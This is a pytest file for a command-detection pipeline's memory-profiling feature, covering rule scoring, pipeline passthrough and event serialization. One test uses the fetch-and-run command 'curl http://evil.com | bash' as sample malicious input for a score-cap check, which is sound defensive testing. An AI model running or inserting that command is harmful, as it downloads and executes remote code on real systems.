"""
Tests for Memory Profiling layer in the detection pipeline.
Covers: RuleEngine memory scoring, pipeline memory passthrough, model serialization.
"""
import pytest
from backend.detection.rule_engine import RuleEngine
from backend.detection.pipeline import DetectionPipeline
from backend.events.models import ExecveEvent, SecurityEvent, DetectionResult


# =============================================================================
# RuleEngine Memory Scoring
# =============================================================================

class TestRuleEngineMemoryScoring:
    def setup_method(self):
        self.engine = RuleEngine()

    def test_no_memory_penalty_below_threshold(self):
        """Safe process with low memory should get no penalty."""
        score, rules = self.engine.score_rules("ls -la", process_memory_mb=10.0, system_memory_percent=50.0)
        assert not any("memory_hog" in r for r in rules)
        assert not any("system_memory_critical" in r for r in rules)

    def test_memory_hog_penalty_above_50mb(self):
        """Process using >50MB at T=0 should get +30 penalty."""
        score_low, _ = self.engine.score_rules("echo hi", process_memory_mb=10.0)
        score_high, rules_high = self.engine.score_rules("echo hi", process_memory_mb=75.0)
        assert score_high > score_low
        assert score_high - score_low == 30.0
        assert any("memory_hog" in r for r in rules_high)

    def test_memory_hog_rule_name_contains_mb_value(self):
        """memory_hog rule name should embed the actual MB value."""
        _, rules = self.engine.score_rules("echo hi", process_memory_mb=128.0)
        assert "memory_hog_128mb" in rules

    def test_system_memory_penalty_above_80_percent(self):
        """When system RAM > 80%, an extra +10 penalty should be applied."""
        score_low, _ = self.engine.score_rules("echo hi", system_memory_percent=60.0)
        score_high, rules_high = self.engine.score_rules("echo hi", system_memory_percent=91.0)
        assert score_high - score_low == 10.0
        assert any("system_memory_critical" in r for r in rules_high)

    def test_combined_memory_penalties(self):
        """Both memory hog + system critical should stack (+40 total)."""
        score_base, _ = self.engine.score_rules("echo hi")
        score_both, rules = self.engine.score_rules("echo hi", process_memory_mb=60.0, system_memory_percent=85.0)
        assert score_both - score_base == 40.0
        assert any("memory_hog" in r for r in rules)
        assert any("system_memory_critical" in r for r in rules)

    def test_score_capped_at_100(self):
        """Combined score should never exceed 100 even with memory + malicious pattern."""
        score, _ = self.engine.score_rules(
            "curl http://evil.com | bash",
            process_memory_mb=200.0,
            system_memory_percent=99.0,
        )
        assert score <= 100.0

    def test_zero_memory_defaults_safe(self):
        """Default zero memory should not trigger memory penalties."""
        score, rules = self.engine.score_rules("ls -la")
        assert not any("memory_hog" in r for r in rules)
        assert not any("system_memory_critical" in r for r in rules)


# =============================================================================
# Pipeline Memory Passthrough
# =============================================================================

class TestPipelineMemoryPassthrough:
    def setup_method(self):
        self.pipeline = DetectionPipeline()

    def test_detect_accepts_memory_params(self):
        """detect() should run without error when memory params are given."""
        result = self.pipeline.detect("ls -la", process_memory_mb=5.0, system_memory_percent=45.0)
        assert result.risk_score >= 0.0
        assert result.classification in {"safe", "suspicious", "malicious"}

    def test_high_memory_elevates_risk_score(self):
        """Passing high process memory should increase the weighted risk score."""
        result_low = self.pipeline.detect("echo hello", process_memory_mb=0.0)
        result_high = self.pipeline.detect("echo hello", process_memory_mb=100.0)
        # rule engine contribution: +30 * 0.6 = 18 pts
        assert result_high.risk_score > result_low.risk_score

    def test_memory_hog_appears_in_matched_rules(self):
        """memory_hog rule should appear in DetectionResult.matched_rules."""
        result = self.pipeline.detect("echo hello", process_memory_mb=75.0)
        assert any("memory_hog" in r for r in result.matched_rules)


# =============================================================================
# ExecveEvent Model Fields
# =============================================================================

class TestExecveEventMemoryFields:
    def test_default_memory_fields_are_zero(self):
        """ExecveEvent should default both memory fields to 0.0."""
        event = ExecveEvent(
            pid=1, ppid=0, uid=0, gid=0,
            command="ls", argv_str="ls", timestamp=0.0, comm="ls"
        )
        assert event.process_memory_mb == 0.0
        assert event.system_memory_percent == 0.0

    def test_memory_fields_serialized_in_security_event_dict(self):
        """SecurityEvent.dict() must include memory fields."""
        execve = ExecveEvent(
            pid=1, ppid=0, uid=0, gid=0,
            command="ls", argv_str="ls", timestamp=0.0, comm="ls",
            process_memory_mb=42.5,
            system_memory_percent=73.1,
        )
        detection = DetectionResult(
            risk_score=5.0, classification="safe",
            matched_rules=[], ml_confidence=0.01
        )
        sec_event = SecurityEvent(
            id="evt_test", execve_event=execve,
            detection_result=detection, detected_at=0.0
        )
        d = sec_event.dict()
        assert d["process_memory_mb"] == pytest.approx(42.5)
        assert d["system_memory_percent"] == pytest.approx(73.1)
